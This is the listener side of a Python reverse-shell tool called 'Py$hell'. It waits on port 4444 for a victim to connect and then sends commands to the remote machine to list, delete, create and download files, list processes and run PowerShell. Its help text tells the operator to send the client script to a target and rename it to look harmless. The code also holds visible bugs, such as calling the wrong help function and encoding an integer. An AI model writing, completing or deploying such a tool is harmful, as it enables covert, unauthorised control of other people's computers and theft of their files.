# Reverse Shell Written in python #

import platform
import socket
import subprocess
import os
import pyfiglet
from colorama import Fore, Style

Light_Red = Fore.LIGHTRED_EX
Cyan = Fore.CYAN
Magenta = Fore.MAGENTA
Red = Fore.RED
Green = Fore.GREEN
Blue = Fore.BLUE
Reset = Fore.RESET
print(f"{Blue}{pyfiglet.figlet_format('Py$hell')}{Reset}")
s = socket.socket()
IP = "127.0.0.1"
PORT = 4444
BUF_SIZE = 2048
FORMAT = 'utf-8'
OS = platform.platform()


def main():
    global conn, addr
    while True:
        try:
            s.bind((IP, PORT))
            break
        except ConnectionRefusedError:
            print(f"{Red}connections refused{Reset}")
            s.close()
            continue
    print(f"{Magenta}[+] Listening For Connection...{Reset}")
    s.listen(5)
    conn, addr = s.accept()
    print(f"{Green}[+] Connection Has Been Established {Reset}")
    print(f"{Cyan}[+] Server Started{Reset}" + "\n" + " | " "IP " + addr[0] + " | Port "
          + str(addr[1]) + " | ")
    answer = reverse_shell(conn)
    if answer == "exit":
        s.close()
        return 0
    else:
        while True:
            try:
                user_input = int(input("Press 1 or Else To Exit:"))
                conn.send(user_input.encode(FORMAT))
                output = conn.recv(BUF_SIZE).decode(FORMAT)
            except ValueError as e:
                print(f"{Red}[!] The Problem Is: {e} {Reset}")
                continue
            if user_input == 1:
                if output == 1:
                    main()
                else:
                    s.close()
                    exit()
                continue
            else:
                return 0


def reverse_shell(conn):
    global command_split
    while True:
        out1 = conn.recv(BUF_SIZE).decode(FORMAT)
        try:
            command = input(f"\n({out1})" + ": ")
            if " " in command:
                command_split = command.split(" ")
            conn.send(command.encode(FORMAT))
            if "exit" == command.lower():
                conn.send('exit'.encode(FORMAT))
                s.close()
                print("\t[!][!][!]  ! EXITING !  [!][!][!]\n")
                return "exit"
            elif "cd" in command.lower():
                stdout = conn.recv(BUF_SIZE).decode(FORMAT)
                print(stdout)
                continue
            elif "ls" in command.lower():
                stdout = conn.recv(BUF_SIZE).decode(FORMAT)
                stdout = "".join(stdout)
                print(stdout)
                continue

            elif "down" in command.lower():
                filename = command_split[1]
                with open(filename, 'wb') as file_to_write:
                    while True:
                        data = s.recv(BUF_SIZE * 10).decode(FORMAT)
                        if not data:
                            break
                        file_to_write.write(bytes(data))
                    file_to_write.close()
            elif "help" in command.lower():
                help()
                continue
            elif "ps" in command.lower():
                stdout = conn.recv(BUF_SIZE).decode(FORMAT)
                print(stdout + "\n")
                continue
            else:
                stdout = conn.recv(BUF_SIZE).decode(FORMAT)
                # stderr = conn.recv(BUF_SIZE).decode(FORMAT)
                print(str(stdout))
                # print(stderr)
                continue
        except Exception as e:
            print(f"{Red}[!] Wrong Options, Error: {e} {Reset}")
            continue
        except BrokenPipeError as d:
            print(f"{Red}[!] Wrong Options, Error: {d} {Reset}")
            continue
        except KeyboardInterrupt as i:
            print(f"{Red}[!] Wrong Options, Error: {i} {Reset}")
            s.close()
            exit()
        s.close()


def help1():
    print("""HELP ME PLEASE:
\tThis is Py$hell, a python based reverse shell.
\tYou need to send to the target the client side of the script.
\tIt will be in the directory by the name reverse-shell_client.py .
\tIt is recommended to change the client side name for a none suspicious name.
\n\tOptions:
\t\tNOTE: You can run any shell code you want but those are reserved!
\t\tcd - : Back to the last directory
\t\tcd .. : Back to the previews directory
\t\tcd  : Empty cd will navigate to the root directory
\t\tcd <path>: Path will navigate to the path directory
\t\tls : Will show the current directory continuing 
\t\tmkdir : Create a new directory
\t\trm -f : Remove a file
\t\trm -d : Remove a directory
\t\ttouch : Create a file 
\t\thelp : Help section of the tool
\t\tstart : Starting a file
\t\tps : Showing running process 
\t\tifconfig : For showing interfaces and IP's 
\t\tpowershell <powershell command> : For running a powershell command (only for windows)
\t\tsysinfo : Show the system information\n
    """)


if __name__ == '__main__':
    main()
    s.close()
